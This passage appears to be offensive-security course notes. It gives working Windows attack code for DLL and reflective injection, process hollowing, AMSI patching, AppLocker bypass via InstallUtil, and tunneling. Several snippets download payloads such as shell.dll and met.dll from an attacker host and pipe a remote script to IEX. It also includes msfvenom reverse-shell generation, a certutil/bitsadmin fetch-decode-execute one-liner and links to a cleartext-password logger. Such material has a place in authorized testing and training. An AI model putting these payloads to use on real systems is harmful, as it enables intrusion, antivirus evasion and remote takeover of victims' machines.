        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {

            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\shell.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://10.10.10.10/shell.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
```
When we compile and execute the completed code, it fetches the meterpreter DLL from our web server and provides a reverse shell

</details>

### Reflective DLL Injection in Powershell

Generate DLL with msfvenom:
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f dll -o shell.dll
```

Open a PowerShell Session with ``-Exec Bypass``
```
$bytes = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/shell.dll')
$procid = (Get-Process -Name explorer).Id
```

Then we import [Invoke-ReflectivePEInjection.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)

```
Import-Module Invoke-ReflectivePEInjection.ps1
```
Then execute
```
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```
Notice the shell.dll is not shown in the loaded DLL listing of Process Explorer.

## Process Hollowing

<details>
  <summary>Expand</summary>

We will launch a suspended svchost.exe process and modify it before it actually starts executing. This is known as Process Hollowing and should execute our payload without terminating it.

We will use ReadProcessMemory to read the first 0x200 bytes of memory. This will allow us to analyze the remote process PE header.
The relevant items are shown in the PE file format header shown below

|Offset|0x00|0x04|0x08|0x0C|
|------|----|----|----|----|
|0x00|0x5A4D (MZ)|||| 			
|0x10|||||	
|0x20|||||
|0x30||||Offset to PE signature|
|0x40|||||
|0x50|||||
|0x60|||||
|0x70|||||
|0x80|0x4550 (PE)||||
|0x90|||||
|0xA0|||AddressOfEntryPoint||
|0xB0|||||
|0xC0|||||

All PE files must follow this format, which enables us to predict where to read from. First, we read the e_lfanew field at offset 0x3C, which contains the offset from the beginning of the PE (image base) to the PE Header. This offset is given as 0x80 bytes in Table 1 but can vary from file to file. The PE signature found in the PE file format header (above) identifies the beginning of the PE header.

Once we have obtained the offset to the PE header, we can read the EntryPoint Relative Virtual Address (RVA) located at offset 0x28 from the PE header. As the name suggests, the RVA is just an offset and needs to be added to the remote process base address to obtain the absolute virtual memory address of the EntryPoint. Finally, we have the desired start address for our shellcode.

As a fictitious example, imagine we locate the PEB at address 0x3004000. We then use ReadProcessMemory to read the executable base address at 0x3004010 and obtain the value 0x7ffff01000000.

We use ReadProcessMemory to read out the first 0x200 bytes of the executable and then locally inspect the value at address 0x7ffff0100003C to find the offset to the PE header. In our example, that value will be 0x110 bytes, meaning the PE header is at 0x7ffff01000110.

Now we can locate the RVA of the entry point from address 0x7ffff01000138 and add that to the base address of 0x7ffff01000000. The result of that calculation is the virtual address of the entry point inside the remote process.

Once we have located the EntryPoint of the remote process, we can use WriteProcessMemory to overwrite the original content with our shellcode. We can then let the execution of the thread inside the remote process continue.

### Process Hollowing in C#
Open Visual Studio and create a .NET standard Console App.
Example: Look for DLLImport for CreateProcessW from www.pinvoke.net. 

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]

        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread); 

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, 
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
        
        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
        
        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

        byte[] data = new byte[0x200];
        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
        
        uint opthdr = e_lfanew_offset + 0x28;
        
        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
        
        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

        byte[] buf = new byte[659] {0xfc,0x48,0x83,0xe4,0xf0,0xe8...}
        
        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

        ResumeThread(pi.hThread);
        }
    }

}
```
Set architecture to x64, switch from debug to release mode and build the solution.

Visualization for e_lfanew offset:
```
PE Start / MZ header  ---->  e_lfanew at offsec 0x3C ----> PE start + e_lfanew + 0x28
                                           |                            |
                                           |                            |
                                           V                            V
                                        PE Header                 Code Entrypoint
```


</details>

# VBA Stomping (via p-code)

https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/

[EvilClippy](https://github.com/outflanknl/EvilClippy)

The most powerful technique of Evil Clippy is “VBA stomping”. VBA stomping abuses a feature which is not officially documented: the undocumented PerformanceCache part of each module stream contains compiled pseudo-code (p-code) for the VBA engine. If the MS Office version specified in the ``_VBA_PROJECT`` stream matches the MS Office version of the host program (Word or Excel) then the VBA source code in the module stream is ignored and the p-code is executed instead.


# Port Redirection and Tunneling
## Plink
* [plink](http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
```
plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.1:3306 10.10.10.10
# avoid prompt 'Store key in cache?'
cmd.exe /c echo y | plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.0:3306 10.10.10.10
```

## netsh
```
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=10.10.10.10 connectport=445 connectaddress=192.168.1.10
```
## HTTPTunneling Through Deep Packet Inspection
* [HTTPTunnel](http://http-tunnel.sourceforge.net/)

Assuming the following setup:

Attacker Machine (Kali): 10.10.10.10
Compromised Machine: 10.10.10.20, additional interface to 192.168.1.0/24
Windows Server: 192.168.1.100
Firewall incoming traffic to ports 80,443 and 4444 (misconfigured)
Objective: Get a RDP Session to the Windows Server

1. Setup local forward on compromised machine
```
ssh -L 0.0.0.0:8888:192.168.1.100:3389
```
2. Setup HTTPTunnel server on compromised machine (hts)
```
hts --foward-port localhost:8888 4444
```
3. Setup HTTPTunnel client on attacker machine
```
htc --forward-port 8080 10.10.10.10:4444
```
4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)

## chisel
Assume we have a windows server that has a webserver that is only available locally (port 9090). We now want to setup a port forwarding so we can access this webserver using our attacker box.

On attacker machine:
```
chisel server -p 9999 --reverse
```

On windows server:

```
.\chisel.exe client 10.10.14.14:9999 R:9090:127.0.0.1:9090
```

Now you can access the webpage under http://localhost:9090


# AV Evasion

## Bypasisng AMSI
AMSI = Anti Malware Scan Interface

We can bypass the amsi.dll by crashing it. The following powershell script can be used:
Info: First a "test rdx, rdx" is performed. If we can replace it with "XOR rax, rax" AMSI will crash since the "zero flag" is set. 

```
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0x48, 0x31, 0xC0)
# restore original memory protection to cover tracks
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

```
test with 'amsiutils' command

Same for JScript
```
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD");
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
	sh.RegWrite(key, 1, "REG_DWORD");
	WScript.Quit(1);
}
```

## BOAZ_beta
Bypass, Obfuscate, Adapt, Zero-Trust (BOAZ)
* https://github.com/thomasxm/BOAZ_beta

# Application Whitelisting
Using existing and trusted applications, is a technique known as "Living off the land" (LOLBAS).
See https://lolbas-project.github.io/ (Windows equivalent of [GTFOBins](https://gtfobins.github.io/))

## Trusted Folders
The default rules for AppLocker whitelist all executables and scripts located in C:\Program Files, C:\Program Files (x86), and C:\Windows. This is a logical choice since it is assumed that non-admin users cannot write executables or scripts into these directories.

In theory, we should be able to execute a program or script in a subdirectory that allows both write and execute. If we can find writable and executable folders on a development machine, we can reuse the bypass later on a compromised machine which has the same rules applied.

To locate user-writable folders, we'll use [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from SysInternals. For this test, we'll execute it from an administrative command prompt to avoid potential AppLocker restrictions.

We'll search C:\Windows with AccessChk, using -w to locate writable directories, -u to suppress any errors and -s to recurse through all subdirectories:

```
C:\Tools\SysinternalsSuite>accesschk.exe "student" C:\Windows -wus
```

Then check each directory manually to verify (looking for "NT AUTHORITY\Authenticated Users:(RX,WD)"):

```
C:\Tools\SysinternalsSuite>icacls.exe C:\Windows\Tasks
```

## Alternate Data Streams
The modern Windows file system is based on the NTFS specification, which represents all files as a stream of data.
While the inner workings of NTFS are complex, for the purposes of this module, it's important to understand that NTFS supports multiple streams.

An Alternate Data Stream (ADS) is a binary file attribute that contains metadata. 
We can leverage this to append the binary data of additional streams to the original file.

To demonstrate this, we'll create the small Jscript file

```js
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
```

We save it as test.js and can take any file and add it's content to an alternate data stream:

```
type test.js > "C:\Path\to\my\file.log:test.js"
```

To view the alternate data streams of a file we can use ``dir /r``.
If we simply double click on the file, our javascript will not be executed.
We need to use wscript and additionally specify the data stream to accomplish this:

```
wscript "C:\path\to\my\file.log:test.js"
```

## Bypassing AppLocker
### PowerShell 

** Custom Runspaces (Bypass CLM): **

PowerShell.exe is essentially a GUI application handling input and output. The real functionality lies inside the System.Management.Automation.dll managed DLL, which PowerShell.exe calls to create a runspace.

It is possible to leverage multithreading and parallel task execution through either Jobs or Runspaces. The APIs for creating a runspace are public and available to managed code written in C#.

This means we could code a C# application that creates a custom PowerShell runspace and executes our script inside it. This is beneficial since, as we will demonstrate, custom runspaces are not restricted by AppLocker. Using this approach, we can construct a constrained language mode bypass to allow arbitrary PowerShell execution.

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            # Create Runspace
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            
            # Instantiate PowerShell Object and assign Runspace 
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            # Write contents of LanguageMode variable to file
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();

            
        }
    }
}
```

The PowerShell execution policy restricts the execution of scripts, but this is a weak protection mechanism 
which can be easily bypassed with the built-in "Bypass" execution policy. 
However, the more robust Language Modes limit the functionality to avoid execution of code like our 
shellcode runner and operates at three distinct levels.

The first (and default) level, FullLanguage, allows all cmdlets and the entire .NET framework as well as C# code execution. 
By contrast, NoLanguage disallows all script text. RestrictedLanguage offers a compromise, allowing default cmdlets but heavily restricting much else.

Get the LanguageMode in Powershell:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

To bypass Applocker we will leverage InstallUtil, a command-line utility that allows us to install and uninstall server resources by executing the installer components in a specified assembly. This Microsoft-supplied tool obviously has legitimate uses, but we can abuse it to execute arbitrary C# code. Our goal is to reintroduce our PowerShell shellcode runner tradecraft in an AppLocker-protected environment.

To use InstallUtil in this way, we must put the code we want to execute inside either the install or uninstall methods of the installer class.

We are only going to use the uninstall method since the install method requires administrative privileges to execute.

<details>
  <summary>Expand</summary>

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```

Compile and executing the binary with administrative command prompt:

```powershell
C:\Tools>Bypass.exe
This is the main method which is a decoy
```

If we execute it with non-administrative command prompt:
```powershell
C:\Users\student>C:\Tools\Bypass.exe
This program is blocked by group policy. For more information, contact your system administrator.
```

To now bypass AppLocker we use the installutil.exe:

```powershell
C:\Users\student>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.3752.0
Copyright (C) Microsoft Corporation.  All rights reserved.


C:\Users\student>type C:\Tools\test.txt
FullLanguage
```

To bypass AV we can encode our binary and transfer the encoded blob, decode it on victim and execute it in memory.

```powershell
C:\Users\Offsec>certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
```

Download the file
```powershell
C:\Users\student>bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt
```

Decode
```powershell
C:\Users\student>certutil -decode enc.txt Bypass.exe
```

Execute
```powershell
C:\Users\student>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```

One-Liner from all commands
```powershell
bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe 

```

As a last step we can use Invoke-ReflectivePEInjection.ps1 to reflectively load a DLL into a remote process

Updated cmd variable:
```powershell
String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
```

</details>

### C#

We have successfully bypassed AppLocker's PowerShell restrictions and have executed arbitrary managed C# and PowerShell code through InstallUtil. However, this relies on the existence of a single binary. If InstallUtil was blocked by a deny rule, this technique would fail. Let's improve our tradecraft by building another AppLocker bypass in C#.

In addition to providing an alternative bypass method for C# code execution, this process demonstrates basic techniques which could aid future research. Discovering a bypass is not completely trivial, so we'll divide this process into a number of steps.


# Shadow Credentials
* pyWhisker: https://github.com/ShutdownRepo/pywhisker

pyWhisker is a Python equivalent of the original Whisker made by Elad Shamir and written in C#. This tool allows users to manipulate the msDS-KeyCredentialLink attribute of a target user/computer to obtain full control over that object.

# Key Logger
* NPPSPy: https://github.com/gtworek/PSBits/blob/master/PasswordStealing/NPPSpy/NPPSPy.c
Simple (but fully working) code for NPLogonNotify(). The function obtains logon data, including cleartext password.


# Delegation
* ADeleg: https://github.com/mtth-bfft/adeleg

Is an Active Directory delegation management tool. It allows you to make a detailed inventory of delegations set up so far in a forest, along with their potential issues:

* Objects owned by users
* Objects with ACEs for users
* Non canonical ACL
* Disabled ACL inheritance
* Default ACL modified in schema
* Deleted delegation trustees
 













